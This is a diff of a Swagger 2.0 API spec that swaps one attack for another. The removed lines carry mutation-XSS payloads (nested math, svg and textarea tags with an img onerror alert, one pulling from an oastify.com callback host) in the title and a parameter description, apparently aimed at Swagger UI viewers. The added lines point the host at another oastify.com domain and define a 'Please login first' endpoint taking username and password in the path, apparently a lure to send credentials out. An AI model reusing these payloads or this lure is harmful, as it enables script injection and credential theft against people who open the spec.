@@ -1,38 +1,24 @@
-swagger: '2.0'
+swagger: "2.0"
 info:
-  title: XSS Attack BY M0X0101
-  description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='http://2mp5qb9b9j6p8tbter1hc2f2nttlhh56.oastify.com' onerror='alert(1)'>">
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
+  version: "v1"
+  title: Please login first
+
+host: 4uz7ydhdhlergvjvmt9jk4n4vv1npkd9.oastify.com
+
 paths:
-  /M0X0101:
-    get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - M0X0101_XSS_D
-      operationId: findAccounts
-      summary: Finds all accounts
-  '/hack/hachid/{id}':
-    delete:
+
+  /{Username}/{Password}:
+    post:
+      summary: Logs in
       parameters:
-        - description: |
-             <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(window.origin)'>">
-          format: int64
-          in: path
-          name: id
+        - name: Username 
           required: true
-          type: integer
+          in: path
+          type: string
+        - name: Password 
+          required: true
+          in: path
+          type: string
       responses:
-        '200':
-          description: No response was specified
+        200:
+          description: Login was successful
